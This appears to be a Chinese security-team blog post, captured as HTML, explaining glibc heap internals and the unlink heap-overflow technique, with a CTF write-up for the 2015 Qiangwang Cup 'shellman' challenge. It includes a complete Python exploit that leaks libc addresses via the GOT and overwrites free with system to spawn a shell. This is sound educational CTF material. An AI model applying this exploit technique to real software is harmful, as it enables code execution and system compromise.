@@ -1,0 +1,148 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>glibc堆溢出学习笔记（兼2015强网杯shellman writeup) | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">glibc堆溢出学习笔记（兼2015强网杯shellman writeup)</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">glibc堆溢出学习笔记（兼2015强网杯shellman writeup)</h1><div class="post-meta">2016-01-22<span> | </span><span class="category"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a><a href="/categories/CTF/">CTF</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 4k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 16</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="post-content"><h3 id="0x01-glibc堆管理机制"><a href="#0x01-glibc堆管理机制" class="headerlink" title="0x01 glibc堆管理机制"></a>0x01 glibc堆管理机制</h3><p>1、Arena、heap与chunk概述<br>Arena是包含堆heap的一块相对独立的内存区域。对于linux下的多线程程序，每个线程可以有不同的Arena，包括Main Arena和Thread Arena。</p>
+<ul>
+<li>Main Arena为主线程建立，只包含一个heap。</li>
+<li>Thread Arena为其他线程 可能包含多个heap。</li>
+</ul>
+<p>根据glibc源码，与heap有关的数据结构或元数据信息包括：</p>
+<ul>
+<li>heap_info：描述一个heap段的heap头。每个线程的Arena可以有个heap，而每一个heap都有自己的heap头。但在初始默认情况下，一个Arena只有一个heap段，当空间耗尽，新的heap将会通过mmap在该Arena的非连续内存区域创建；</li>
+<li>malloc_state：描述一个Arena的Arena头。一个Arena可以有多个heap，但只有一个Arena头，Arena头包含bins、top chunk（顶堆块）、last remainder chunk（剩余堆块）等重要信息。</li>
+<li>malloc_chunk：chunk header（堆块头）。根据程序的请求，一个heap可以分解成多个chunk，每个chunk都有自己的chunk header。<br>因此，按照从大到小的顺序，Arena包括一个或多个heap，一个heap包括多个chunk。Arena、heap和chunk都有自己的头部。如图所示，</li>
+</ul>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/1.png" alt="1"><br>图  Main Arena与Thread Arena(一个heap)</p>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/2.png" alt="2"><br>图  Thread Arena（多个heap)</p>
+<p>2、Chunk的类型</p>
+<p>下面重点探讨chunk，一个heap中的chunk主要包含以下四种类型：</p>
+<ul>
+<li>Allocated Chunk：</li>
+<li>free Chunk：</li>
+<li>top Chunk:</li>
+<li>last remainder Chunk</li>
+</ul>
+<p>(1) Allocated Chunk</p>
+<p>如图，均为4字节（32bit）或8字节（64bit）对齐的内存块。</p>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/3.png" alt="3"></p>
+<p>注意，被分配的Allocated Chunk不使用fd、bk等指针。也就是说，在malloc_chunk(Chunk Header)中，不使用fd、bk等指针来维护Allocated Chunk的信息，用户请求的内存分配长度都被转换为Internal Reprenstation Size，满足8字节对齐的需求。如图 ，chunk size的最后三位不使用，而是用来存储状态信息。</p>
+<p>（2）free Chunk</p>
+<p>free Chunk如图所示，与Allocated Chunk相比，多了fd和bk指针，fd指向binlist(所谓binlist中，是指存储free chunk指针数组，数组成员指向一个个的Free Chunk)中上一个free chunk，bk指向binlist中下一个free chunk。 在内存区域中，两块free chunk不能相邻，如果相邻，glibc则会将两个相邻的free chunk合并（合并时会有改写内存的机会，堆溢出漏洞多利用此）。因此，prev_size总是包含上一个chunk的用户数据。只有在将要发生合并前，prev_size才为上一free chunk的size。</p>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/4.png" alt="4"></p>
+<p>3、bins</p>
+<p>bins就是存储freelist（指向free chunk 的指针，这些free chunk按照链表组织在一起）的数据结构，根据chunk size的不同，bins又分为四种类型：</p>
+<ul>
+<li><p>Fast bin</p>
+</li>
+<li><p>Unsorted bin</p>
+</li>
+<li><p>Small bin</p>
+</li>
+<li><p>Last remainder bin<br>存储bin的数据结构又有两种：</p>
+</li>
+<li><p>FastbinsY：存放fast bin的数组；</p>
+</li>
+<li><p>bins：存放unsorted、small和large bin的数组，总共有126个bin。</p>
+<ul>
+<li>Bin 1：用于unsorted bin</li>
+<li>Bin 2 到 Bin 63：用于small bin·</li>
+<li>Bin 64到 Bin 126：用于Large bin</li>
+</ul>
+</li>
+</ul>
+<p>下面对各种bins进行介绍<br>Fast bin</p>
+<ul>
+<li><p>存放16~80字节的chunk（fast chunk），fast bin在内存分配和释放方便是速度最快的。</p>
+</li>
+<li><p>bin的数量：10</p>
+</li>
+<li><p>每一个bin包括指向一个单向链表（binlist）的指针，对binlist的增删操作均在链表的起始进行（LIFO）；</p>
+</li>
+<li><p>Chunk的大小：8字节的整数倍。第一个fast bin(index 0)的指针指向16字节的binlist，第二个fast bin(index 1)的指针指向24字节的binlist，以此类推……。</p>
+</li>
+<li><p>同一个fast bin中的chunk大小相同。</p>
+</li>
+<li><p>在malloc初始化时，最大的fast bin的chunk size为64字节（不是80），因此默认情况下的fast chunk size取值范围为16到64字节。</p>
+</li>
+<li><p>不会合并，两个内存中相邻的free chunk不会合并成一个free chunk，尽管会产生碎片，但是提高了free的速度。</p>
+</li>
+<li><p>malloc(fast chunk)：初始状态fast bin的chunk最大值及索引均为空，因此当用户请求fast chunk时，先是调用分配small bin的代码，而非fast bin的代码，后续当该chunk不为空时，则计算fast bin 的索引，并获得对应的binlist。接着移除binlist中的第一个chunk，返回给用户</p>
+</li>
+<li><p>free(fast chunk) : 计算fast bin的索引，并计算对应的binlist，这个free掉的fast chunk添加到所获取binlist中的最前端<br><img src="/2016/01/22/glibc-heap-ctf-writeup/5.png" alt="5"><br>Unsorted bin<br>当small chunk或large chunk free时，它们并不是添加进对应的bins，而是进入unsorted bins，这给了“glibc malloc”第二次机会重用最近free掉的chunks。</p>
+</li>
+<li><p>bin的数量：1，使用环形双向链表（binlist)来组织free chunks；</p>
+</li>
+<li><p>chunk大小：没有大小的限制，任何size的chunk都可以属于unsorted bin。</p>
+</li>
+</ul>
+<p>Small Bin（对安全影响大，重点）<br>包含小于512字节的chunk（指针）,在内存分配和释放上，small bins比large bins快一些，但比fast bins慢。</p>
+<ul>
+<li>bin的数量：62，同样使用环形双向链表（binlist）来组织free chunks。unlink发生在binlist的中间，对list的添加和删除分别在头部和尾部（FIFO)</li>
+<li>chunk大小：8字节对齐，例如，第一个Small bin（bin2），包含16字节chunk的binlist。第二个small bin(bin3)，包含24字节chunk的binlist，依次类推……。同一个small bin包含同样大小的chunk，因此无需排序。</li>
+<li>合并：两个相邻的free chunk将会被合并，合并减少了碎片，但是也拖慢了free的速度。</li>
+<li>malloc(small chunk)：初始状态small bins为空，当用户请求时，先是调用unsorted bin的代码。接着在第一次调用malloc的过程中，malloc_state中small bin和large bin的数据结构（bins）被初始化，例如bins将指向自身来表明其为空。后续过程中，当small bin非空，对应binlist中的最后一个chunk被移除，并返回给用户。</li>
+<li>free(small chunk)：free一个chunk时，检查相邻的前续及后续chunk是否free，如果是free则合并。此后，这个合并后的chunk就会被unlink掉，并被添加进unsorted bin list的起始。</li>
+</ul>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/6.png" alt="6"></p>
+<p>Large Bin:<br>用于组织超过512字节的chunk，内存分配释放速度慢于small bins。</p>
+<ul>
+<li><p>bin的数量：63。每一个large bin也包含一个环形双向链表。在这63个bins当中，<br>有32个bins包含binlist的chunk size为64字节的倍数，例如，第一个large bin(bin 65)binlist的chunk size为512和568，第二个large bin(bin 66)binlist的chunk size为576和632，依次类推……<br>有16个bins包含binlist的chunk size为512的倍数。<br>有8个bins包含binlist的chunk size为4096的倍数。<br>有4个bins包含binlist的chunk size为32768的倍数。<br>有2个bins包含binlist的chunk size为262144的倍数。<br>1个bin只有一个chunk，其size为剩下的size。</p>
+</li>
+<li><p>与small bin不同，large bin的chunks大小不同，因此按照size大小降序排列，最大的chunk存储在binlist的起始，最小的chunk存储在binlist的末尾。</p>
+</li>
+<li><p>合并：两个内存中相邻的free chunk将被合并。</p>
+</li>
+<li><p>malloc(large chunk) – 初始状态，所有的large bins将为空。当用户请求一个large chunk时，调用的是next largest bin code，而非large bin code。第一次调用malloc时，malloc_state中的small bin和large bin数据结构被初始化，bins将指向自身表明其为空。后续当large bin非空时，如果binlist中最大的chunk size比用户请求的size大，binlist就从末尾到起始进行搜索，直到找到一个接近或等于用户请求size的chunk，此时该chunk将分裂（split)成两个chunk，一个（等于用户请求的size)返回给用户，另一个(大小等于剩余的size)，被添加进unsorted bin。如果binlist中最大的chunk size仍然小于用户请求的size，那么就将使用next largest bin来满足用户的请求。next largest bin的代码扫描binmap来寻找非空的next largest bin，如果找到，从该binlist中的合适的chunk就会分裂成合适大小返回给用户。如果没有找到，则使用top chunk</p>
+</li>
+<li><p>free(large chunk) – 与free(small chunk)类似</p>
+</li>
+</ul>
+<p>Top Chunk：在arena的顶部边界区，不属于任何bin，用来在没有free的内存块时，满足用户的内存分配请求，如果top chunk size比用户请求的size大，则同样分裂成User chunk（等于用户请求的size）和Remainder chunk（等于剩余size),然后remainder chunk就变成新的top chunk。如果top chunk size小于用户请求的size，那么top chunk就会被sbrk（main arena)或者mmap（thread arena)系统调用扩展。</p>
+<p>Last Remainder Chunk：从最近的small request中分出来剩下的chunk（具体细节见参考文献）。</p>
+<h3 id="0x02-堆溢出原理"><a href="#0x02-堆溢出原理" class="headerlink" title="0x02 堆溢出原理"></a>0x02 堆溢出原理</h3><p>堆溢出的利用主要围绕在bin（主要是small bin?)中free chunk的合并过程，在两个free chunk合并的过程中，有两次改写地址的机会。例如，对于将要合并的Chunk P，在合并发生时，glibc将Chunk P 从binlist中unlink掉，主要涉及到以下指针操作（取自glibc源码中的unlink宏）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD &#x3D; P-&gt;fd;   &#x2F;&#x2F;FD为相对于P下一个chunk的地址</span><br><span class="line">BK &#x3D; P-&gt;bk; &#x2F;&#x2F;BK为相对于P上一个chunk的地址</span><br><span class="line">FD-&gt;bk &#x3D; BK; &#x2F;&#x2F;用上一个chunk的地址去改写下一个chunk的前续指针bk，即改写FD+12（32bit)或FD+24(64bit)地址中的内容</span><br><span class="line">BK-&gt;fd &#x3D; FD;&#x2F;&#x2F;用下一个chunk的地址去改写上一个chunk的后续指针fd，即改写BK+8（32bit)或BK+16(64bit)地址中的内容</span><br></pre></td></tr></table></figure>
+
+<p>特别注意上面最后两行等号，实际是两次改写地址！这样如果P是攻击者精心伪造的chunk，则在unlink P时，可改写FD+12或BK+8（32bit)为攻击者指定的地址。例如，攻击者可以结合程序的具体情况，使P具备被unlink的条件（主要是prev_size和size的设置) ，并且</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD&#x3D;free@got-12</span><br><span class="line">BK&#x3D;shellcode地址</span><br></pre></td></tr></table></figure>
+<p>这样，在unlink发生时， FD-&gt;bk=free@got-12+12=free@got,其内容被shellcode地址改写，这样在程序在下一次执行free时，实际将执行shellcode。这就是堆溢出的基本原理。</p>
+<p>然而，现在的glibc在unlink P时还增加了一些安全检查机制，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                    </span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);</span><br></pre></td></tr></table></figure>
+
+
+<p>它会检查下一个chunk的bk以及上一个chunk的fd是否均为P，因此上面的利用方法已经不可行，因为FD-&gt;bk变成了free@got，而BK-&gt;fd变成了shellcode的地址+8。此时，为了绕过检查，需要找一个内容可控的已知地址ptr（ 设<code>*ptr =    pControllable</code>, pControllable开始的内存可控），那么在32bit系统中，伪造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd &#x3D; ptr-12</span><br><span class="line">P-&gt;bk&#x3D; ptr -8</span><br></pre></td></tr></table></figure>
+
+<p>或者在64bit系统中，伪造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd &#x3D; ptr - 24</span><br><span class="line">P-&gt;bk &#x3D; ptr - 16</span><br></pre></td></tr></table></figure>
+
+<p>则FD-&gt;bk=BK-&gt;fd=ptr</p>
+<p>此时，当unlink P发生时，ptr这个地址中的值被改写两次（以64bit为例），第一次改写为ptr-16，第二次改写为ptr-24，最终改写为ptr-24。此时， 所以 pControllable=ptr-24 ，所以ptr-24开始的内存空间可控，那么在ptr-24开始的内存空间填入内容，就又可以改写ptr这个地址存储的内容pControllable。此时，我们改写pControllable为GOT表中的函数地址如free@GOT,就可以编辑GOT表了，把free@GOT这个地址的内容改写为system@GOT，那么在下次调用free的时候，就会调用system函数以实现代码执行。<br>下面我们结合强网杯2015的一道300分题目进行分析。</p>
+<h3 id="0x03-shellman分析"><a href="#0x03-shellman分析" class="headerlink" title="0x03 shellman分析"></a>0x03 shellman分析</h3><p>首先观察题目，shellman这个程序主要有以下功能：</p>
+<p>1.list shellcode：显示已经建立的堆块（Chunk）中存储的内容</p>
+<p>2.New shellcode：建立一个新的堆块，大小和内容由用户决定</p>
+<p>3.Edit shellcode：对一个已经分配的堆块做编辑，这个地方没有限制大小若太长可造成堆溢出</p>
+<p>4.Delete shellcode: 释放一个已经分配的堆块</p>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/7.png" alt="7"></p>
+<p>程序还有一个全局数组用于存储已分配堆块malloc返回的地址，以及长度和本堆块是否占用的指针，如图<br><img src="/2016/01/22/glibc-heap-ctf-writeup/8.png" alt="8"></p>
+<p>由于bss段的地址固定，这个全局数组的存在就使得漏洞利用变得简单起来。使用unlink去利用这个堆溢出漏洞的思路如下：</p>
+<p>一，分配两个长度合适的堆块，可以使用小于512字节的small bin，如0xa0这个长度。此时，chunk0和chunk1被占用，所以fd、bk均为空</p>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/9.png" alt="9"></p>
+<p>二、对chunk0进行编辑，并溢出到chunk1，在chunk0 malloc返回地址开始的内存伪造一个chunk P，设置好prev_size、size&amp;Flag。同时设置chunk1的prev size以及size&amp;Flag（prev size应为P的size，且Flag的P位设置为0，使glibc认为前一个chunk P状态是free）。如图</p>
+<p><img src="/2016/01/22/glibc-heap-ctf-writeup/10.png" alt="10"></p>
+<p>三，删掉chunk1,触发unlink(p)，将p给改写。</p>
+<p>在删除chunk1时，glibc会检查一下自己的size部分的prev_inuse FLAG，发现到到比较早的一个chunk是空闲的(实际是我们伪造的chunk P)，glibc希望将即将出现的两个空闲块合并。glibc会先将我们伪造的这个chunk P从它 的binlist中解引用，所以触发unlink P。</p>
+<p>这里我们找的内容可控的已知地址就是bss段存储已分配堆块地址的全局数组ptr=0x6016D0（根据程序逻辑，<code>*ptr=*0x6016D0=pControllable</code>是已分配堆块，内容可编辑）。按照前文叙述，unlink P就触发以下操作，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1).FD&#x3D;p-&gt;fd(即0x6016D0-0x18)</span><br><span class="line">2).BK&#x3D;p-&gt;bk(即6016D0-0x10)</span><br><span class="line">3).检查是否满足上文所示的限制，由于FD-&gt;bk和BK-&gt;fd均为0x6016D0(即p)，因此可以过掉这个限制</span><br><span class="line">4).FD-&gt;bk&#x3D;BK</span><br><span class="line">5).BK-&gt;fd&#x3D;FD(*ptr&#x3D;0x6016D0-0x18)</span><br></pre></td></tr></table></figure>
+
+<p>四、此时<code>*ptr=0x6016D0-0x18</code>，由于已分配堆块地址的全局数组的存在，程序认为<code>*ptr=*（0x6016D0-0x18)</code>为已分配的第一个堆块，那么我们对<code>0x6016D0-0x18</code>开始的内存进行编辑，将free@got的地址写入0x6016D0。由于从<code>0x6016D0-0x18</code>开始写，写入的时候注意不要破坏全局数组中堆块的长度及是否被占用的状态信息（bss段中0x6016C0存储是否占用的标志，0x6016C8存储已分配堆块的长度）</p>
+<p>五、现在<code>*ptr=free@got</code>了，只要使用一次List功能便可以知道free函数的真实地址，进而算出libc的基址来过掉ASLR。</p>
+<p>六、根据已经算出的libc基址再次算出system函数的真实地址。同样，这时程序认为<code>*ptr</code>为已分配的第一个堆块，那么我们对<code>*ptr</code>也就是free@got这个地址开始的内存进行编辑，将free@got存储的内容改为system函数的地址。</p>
+<p>七、因为free已经变成了system，只要再建立一个内容为<code>/bin/sh</code>的块，再删掉，就可以得到shell，由此全部利用完成。</p>
+<p>利用代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;.&#x2F;shellman&#39;</span><br><span class="line"></span><br><span class="line">def new_sc(io, sc):</span><br><span class="line">    io.read_until(&#39;&gt;&#39;)</span><br><span class="line">    io.writeline(&#39;2&#39;)</span><br><span class="line">    io.read_until(&#39;:&#39;)</span><br><span class="line">    io.writeline(str(len(sc)))</span><br><span class="line">    io.read_until(&#39;:&#39;)</span><br><span class="line">    io.write(sc)</span><br><span class="line"></span><br><span class="line">def edit_sc(io, index, new_sc):</span><br><span class="line">    io.read_until(&#39;&gt;&#39;)</span><br><span class="line">    io.writeline(&#39;3&#39;)</span><br><span class="line">    io.read_until(&#39;:&#39;)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line">    io.read_until(&#39;:&#39;)</span><br><span class="line">    io.writeline(str(len(new_sc)))</span><br><span class="line">    io.read_until(&#39;:&#39;)</span><br><span class="line">    io.write(new_sc)</span><br><span class="line"></span><br><span class="line">def delete_sc(io, index):</span><br><span class="line">    io.read_until(&#39;&gt;&#39;)</span><br><span class="line">    io.writeline(&#39;4&#39;)</span><br><span class="line">    io.read_until(&#39;:&#39;)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">def list_sc(io):</span><br><span class="line">    io.read_until(&#39;&gt;&#39;)</span><br><span class="line">    io.writeline(&#39;1&#39;)</span><br><span class="line">    io.read_until(&#39;SHELLC0DE 0: &#39;)</span><br><span class="line">    return l64(io.read(16).decode(&#39;hex&#39;))</span><br><span class="line"></span><br><span class="line">def exp(target):</span><br><span class="line">    io &#x3D; zio(target, timeout&#x3D;10000, print_read&#x3D;COLORED(RAW, &#39;red&#39;), print_write&#x3D;COLORED(RAW, &#39;green&#39;))</span><br><span class="line">    new_sc(io, &#39;a&#39;*0xa0) #0x603010</span><br><span class="line">    new_sc(io, &#39;b&#39;*0xa0) #0x6030c0</span><br><span class="line">    new_sc(io, &#39;&#x2F;bin&#x2F;sh;&#39;+&#39;c&#39;*0x98) #0x603170</span><br><span class="line">    ptr_addr &#x3D; 0x00000000006016d0</span><br><span class="line">    payload &#x3D; l64(0) + l64(0xa1) + l64(ptr_addr-0x18) + l64(ptr_addr-0x10) + &#39;a&#39;*0x80 + l64(0xa0) + l64(0xb0) #notice, the size of original chunk1 is 0xa0+2*8&#x3D;0xb0 is untouched, we just change prev_size</span><br><span class="line">    edit_sc(io, 0, payload)</span><br><span class="line">    delete_sc(io, 1) #trigger unlink,  change *0x6016d0 &#x3D; 0x6016b8</span><br><span class="line">    free_got &#x3D; 0x0000000000601600</span><br><span class="line"></span><br><span class="line">    &#39;&#39;&#39; when debugging at the run time, we can find</span><br><span class="line">    *0x6016b8 &#x3D; l64(0x0), *0x6016c0 &#x3D; l64(0x1), *0x6016c8 &#x3D; l64(0xa)</span><br><span class="line">    we don&#39;t change these memories execpt *0x6016d0</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    payload2 &#x3D; l64(0x0) + l64(0x1) +l64(0xa) + l64(free_got)</span><br><span class="line">    edit_sc(io, 0, payload2)</span><br><span class="line">    free_addr &#x3D; list_sc(io)</span><br><span class="line">    print hex(free_addr)</span><br><span class="line">    libc_base &#x3D; free_addr - 0x0000000000083c30 #free@libc, find in objdump my libc.so</span><br><span class="line">    system_addr &#x3D; libc_base + 0x00000000000468f0 #system@libc, find in objdump my libc.so</span><br><span class="line">    edit_sc(io, 0, l64(system_addr))</span><br><span class="line">    delete_sc(io, 2)</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line">    exp(target)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04 参考文献"></a>0x04 参考文献</h3><ol>
+<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></li>
+<li><a href="http://drops.wooyun.org/tips/7326" target="_blank" rel="noopener">http://drops.wooyun.org/tips/7326</a></li>
+</ol>
+</div><div class="tags"><a href="/tags/PWN/"><i class="fa fa-tag"></i>PWN</a></div><div class="post-nav"><a class="pre" href="/2016/01/27/ios-hook/">iOS客户端hack的两种姿势</a><a class="next" href="/2015/10/24/Drozer-modules/">实战Drozer模块编写</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">审计工具</a> <a href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意程序</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/IOS/" style="font-size: 15px;">IOS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/19/Java-Debug/">Java无源码调试之英雄崛起</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/android-blueborne2/">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/blueborne/">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> 